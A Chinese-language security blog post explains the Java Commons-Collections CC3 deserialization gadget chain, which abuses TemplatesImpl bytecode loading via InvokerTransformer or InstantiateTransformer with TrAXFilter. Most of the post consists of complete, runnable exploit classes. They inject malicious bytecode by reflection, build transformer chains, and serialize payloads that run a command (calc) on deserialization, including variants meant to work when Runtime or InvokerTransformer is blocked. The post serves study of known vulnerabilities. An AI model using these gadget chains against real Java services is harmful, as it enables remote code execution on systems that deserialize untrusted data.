---
title: "基于类加载的多路径TemplatesImpl CC3"
onlyTitle: true
date: 2024-8-1 18:08:32
categories:
- java
- CC
tags:
- CC
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B893.png

---



上一文讲到类加载的底层原理

https://godownio.github.io/2024/07/31/java-lei-jia-zai-ji-shuang-qin-wei-pai/

最后是defineClass加载类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731182329733.png)

尽管defineClass是protected final，其他地方依然有调用到该方法，让我们可以构造底层的恶意类加载攻击。

比如bcel，TemplatesImpl

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731190735428.png)

先来看TemplatesImpl$TransletClassLoader



# CC3 TemplatesImpl链

## newInstance加载

该方法为default属性，必定被类内其他方法调用，跟进一下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801090429873.png)

在同一个类里的defineTransletClasses()循环调用了该方法加载\_bytecodes数组。读一下代码，只要\_bytecodes[]不为空，就能触发defineClass

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801090629731.png)

该private方法也必定被类内其他方法调用，有三个方法都调用了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801090946739.png)

先看一下第一个getTransletClasses()方法，注意上面的英文注释，该方法出于安全原因设为私有，因为和Apache部分项目整合的原因才没有移除。所以我们没有Apache的项目是没有调用该方法的地方的。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801091800270.png)

getTransletIndex作为public也没有地方被调用

那只能看getTransletInstance了，方法名叫获取转移实例，方法内正好就有newInstance()，这不巧了吗！

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801092338109.png)

触发defineTransletClasses()并走到newInstance，需要\_name不为空，_class为空



## public newTransformer方法调用

getTransletInstance作为private，还得往上找到public，因为别的类只能调用另一个类的public方法，这样才能转到readObject嘛。向上走到newTransformer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801093005119.png)

我们建一个TransfomerImpl实例测试一下

TransfomerImpl有一个空的构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801133458125.png)

\_name不为空，\_class为空，\_bytecodes为恶意代码

```java
		byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            }
```

注意在defineTransletClasses中，\_tfactory调用了方法，虽然\_tfactory为transient，无法序列化传递，

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801134035080.png)

但该类的readObject给\_tfactory赋了值。我们测试的时候也先给个值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801134157676.png)

```java
else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
```

由于我们的CC6代码要在newInstance时触发，所以要把整个defineTransletClasses()走完。有报错就要处理。

读一下这段代码，classCount为bytecodes数组元素个数，大于1才给auxClasses赋值。如果这里不赋值，后面的auxClasses.put会报错。

所以我们有两种解决办法，一种是传两个byte元素的bytecodes，这样classCount>1，就能put进去。并反射修改_transletIndex的值不小于0，不然会报Error。一种是走if，不用管auxClasses

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801134843495.png)



### 双byte通过else

```java
public class CC3TemplatesImpl {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry.class"));
        byte[] code2 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\BImpl.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1,code2});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            } else if (field.getName().equals("_transletIndex")) {
                field.set(templatesClass, 0);
            }
        }
        templatesClass.newTransformer();
    }
}
```

code2随便传，但注意不能和code1相同，会进第一个catch，也不能为空，会进第二个catch。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135629459.png)

但是由于我们传入的类无法转为AbstractTranslet而报错。但是不重要

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135931055.png)



### 继承AbstractTranslet通过if

第二种方式，走进if，不走else，就不用管auxClasses。而且给transletIndex赋值了，不用自己去赋值。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135711749.png)

如果要走进if，需要加载的类继承自如下类。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801135825907.png)

那我们改一下CC6，继承AbstractTranslet并实现抽象方法

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;


public class CC6TiedMapEntry2 extends AbstractTranslet {
    public CC6TiedMapEntry2() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        map.remove("test1");
        Class lazymapClass = lazyMap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, chainedTransformer);
        serialize(hashMap);
        unserialize("cc6.ser");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

```java
public class CC3TemplatesImpl {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry2.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        templatesClass.newTransformer();
    }
}
```

也是成功加载

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801140609456.png)



## 链接到readObject

### 直接触发TemplatesImpl#newTransformer

InvokerTransformer能调用任意公开的方法，在这里也就是newTransformer。直接在后面链上

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(templatesClass),
        new InvokerTransformer("newTransformer",new Class[]{},new Object[]{}),
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

后面随便截取一段其他CC的代码接着触发chainedTransformer就行了。这里就用CC6后面的代码.

完整代码1：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

public class CC3TemplatesImpl {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry2.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templatesClass),
                new InvokerTransformer("newTransformer",new Class[]{},new Object[]{}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        map.remove("test1");
        Class lazymapClass = lazyMap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, chainedTransformer);
        serialize(hashMap);
        unserialize("cc6.ser");
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

这样Runtime被ban了也能执行命令，而且加载字节码的后续利用范围也更多。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801173716026.png)



那InvokerTransformer也被ban了呢？

### InstantiateTransformer触发TrAXFilter构造器

直接触发newTransformer的如图，Process是在main里，没办法用。

getOutputProperities作为一个getter方法，在后面的CC11和fastjson中会用到。先略过

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801162850297.png)

TranformerFactoryImpl及其父类都没有继承serializable接口，虽然没有继承serializable的一些类依然有办法在反序列化获取实例，比如我们前面的chainedTransformer，实际上整个序列化过程都没有用到Runtime的实例，创建实例的过程发生在反序列化途中。但这种方式要求`构造函数`或者`获取实例的方法`能传进需要的参数，因为链式的过程中无法再去反射修改实例的字段。你看我们反射修改都是在序列化对象上。

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

> 所以我们可以做个小总结，目前能调用使用非serializable类的地方只有InvokerTransformer的链式调用中。

我们看TranformFactoryImpl，需要指定templates为上文生成的templatesClass

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801171206983.png)

那有没有获取实例的地方或者构造函数能修改templates呢，答案是没有

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801171345478.png)

所以这个类不能用。

最后我们看TrAXFilter类，虽然该类没有继承serializable，在构造函数中就给templates赋值，并调用了newTransformer()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801173904154.png)

怎么触发构造函数呢？

本链官方给出了InstantiateTransformer类，该类的transform获取构造器，并newInstance()，等于调用了构造函数。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801174100867.png)

构造函数传进去调用指定构造器

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801174410156.png)

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesClass}),
        };       
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801175725066.png)

轻松拿下



完整代码2：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3TrAXFilter {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry2.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesClass}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        map.remove("test1");
        Class lazymapClass = lazyMap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, chainedTransformer);
        serialize(hashMap);
        unserialize("cc6.ser");
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```



上面各序列化代码去掉\_tfactory的赋值依旧能用，原理上面说过了。

目前以下几个路径都能触发命令执行or代码执行

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801180040465.png)